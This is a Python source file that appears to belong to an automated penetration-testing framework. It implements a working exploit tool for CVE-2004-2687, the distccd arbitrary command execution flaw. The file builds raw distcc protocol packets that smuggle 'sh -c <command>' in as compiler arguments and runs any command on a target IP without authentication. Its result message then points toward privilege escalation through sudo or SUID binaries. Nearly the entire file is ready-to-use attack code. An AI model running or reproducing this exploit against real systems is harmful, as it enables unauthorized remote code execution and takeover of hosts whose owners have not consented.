"""
TIRPAN — distccd Exploit Tool
================================
Exploits CVE-2004-2687: the distcc distributed compiler daemon executes
arbitrary commands passed as part of a compilation job.

The daemon (port 3632) accepts COMPILE jobs. By crafting a job that contains
shell commands instead of actual C code, we get arbitrary command execution
as the user running distccd (typically 'daemon' on Metasploitable2).

From daemon → root: check sudo -l, SUID binaries, or kernel exploits.
"""

from __future__ import annotations

import asyncio
import logging
import struct

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_DEFAULT_PORT    = 3632
_CONNECT_TIMEOUT = 10
_CMD_TIMEOUT     = 20

# distcc protocol token constants
_DISTCC_MAGIC  = b"DIST"
_DT_ARGC       = b"ARGC"
_DT_ARGV       = b"ARGV"
_DT_DOTI       = b"DOTI"
_DT_DONE       = b"DONE"
_DT_STAT       = b"STAT"
_DT_SERR       = b"SERR"
_DT_SOUT       = b"SOUT"


def _distcc_token(token: bytes, data: bytes) -> bytes:
    """Build a distcc protocol token: 4-byte tag + 8-byte hex length + data."""
    return token + f"{len(data):08x}".encode() + data


class DistccTool(BaseTool):

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="distcc_exec",
            category="exploit-exec",
            description=(
                "Exploits CVE-2004-2687 in distccd (port 3632). "
                "The distcc distributed compiler daemon executes arbitrary OS commands "
                "passed as compilation arguments. No authentication required. "
                "Affected: distcc 2.x on Metasploitable2 and other legacy systems. "
                "Actions:\n"
                "  check  — test if target is vulnerable (runs 'id' command)\n"
                "  exec   — execute an arbitrary command as the daemon user"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address",
                    },
                    "action": {
                        "type": "string",
                        "description": "'check' | 'exec'",
                        "default": "check",
                    },
                    "command": {
                        "type": "string",
                        "description": "OS command to execute (default: 'id')",
                        "default": "id",
                    },
                    "target_port": {
                        "type": "integer",
                        "description": "distccd port (default: 3632)",
                        "default": 3632,
                    },
                },
                "required": ["target_ip"],
            },
        )

    async def execute(self, params: dict) -> dict:
        target_ip   = params.get("target_ip", "").strip()
        action      = params.get("action", "check")
        command     = params.get("command", "id")
        target_port = int(params.get("target_port", _DEFAULT_PORT))

        if not target_ip:
            return {"success": False, "output": None, "error": "target_ip is required"}

        if action in ("check", "exec"):
            return await self._exploit(target_ip, target_port, command)
        return {"success": False, "output": None, "error": f"Unknown action: {action}"}

    async def _exploit(self, target_ip: str, port: int, command: str) -> dict:
        """
        Send a crafted distcc COMPILE job that executes 'sh -c <command>'.
        The payload injects shell commands as compiler arguments.
        """
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, port),
                timeout=_CONNECT_TIMEOUT,
            )
        except Exception as e:
            return {
                "success": False, "output": None,
                "error": f"Cannot connect to {target_ip}:{port} — {e}"
            }

        try:
            # Build the exploit payload:
            # We pass: sh -c 'command' as the compiler arguments
            # distcc will execute: sh -c '<command>' on the target
            argv = [
                b"sh",
                b"-c",
                command.encode(),
                b"#",        # rest of args are ignored as a comment
                b"-o",
                b"/tmp/distcc_out",
            ]

            # DIST header + ARGC
            request = _DISTCC_MAGIC
            request += _distcc_token(_DT_ARGC, f"{len(argv):08x}".encode())
            for arg in argv:
                request += _distcc_token(_DT_ARGV, arg)
            # DOTI: empty input file (we don't actually compile anything)
            request += _distcc_token(_DT_DOTI, b"")

            writer.write(request)
            await writer.drain()

            # Read response
            stdout_data = b""
            stderr_data = b""
            status_code = -1

            deadline = asyncio.get_event_loop().time() + _CMD_TIMEOUT
            while asyncio.get_event_loop().time() < deadline:
                try:
                    header = await asyncio.wait_for(reader.readexactly(12), timeout=5)
                except (asyncio.IncompleteReadError, asyncio.TimeoutError):
                    break

                tag = header[:4]
                length = int(header[4:12], 16)

                data = b""
                if length > 0:
                    try:
                        data = await asyncio.wait_for(
                            reader.readexactly(length), timeout=10
                        )
                    except (asyncio.IncompleteReadError, asyncio.TimeoutError):
                        break

                if tag == _DT_SOUT:
                    stdout_data += data
                elif tag == _DT_SERR:
                    stderr_data += data
                elif tag == _DT_STAT:
                    try:
                        status_code = int(data.decode().strip(), 16)
                    except Exception:
                        pass
                    break
                elif tag == _DT_DONE:
                    break

            stdout_str = stdout_data.decode(errors="replace").strip()
            stderr_str = stderr_data.decode(errors="replace").strip()
            output_str = stdout_str or stderr_str

            if output_str or status_code == 0:
                return {
                    "success": True,
                    "output": {
                        "command":     command,
                        "stdout":      stdout_str,
                        "stderr":      stderr_str,
                        "return_code": status_code,
                        "cve":         "CVE-2004-2687",
                        "note": (
                            "distcc arbitrary command execution confirmed. "
                            "Shell runs as 'daemon' user. "
                            "Next: check sudo -l or SUID binaries for privilege escalation."
                        ),
                    },
                    "error": None,
                }
            return {
                "success": False,
                "output": None,
                "error": (
                    f"distcc exploit sent but no output received "
                    f"(status={status_code}). Target may be patched or filtered."
                ),
            }

        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def health_check(self) -> ToolHealthStatus:
        return ToolHealthStatus(
            available=True,
            message="distcc_exec (raw protocol, no binary required)",
        )
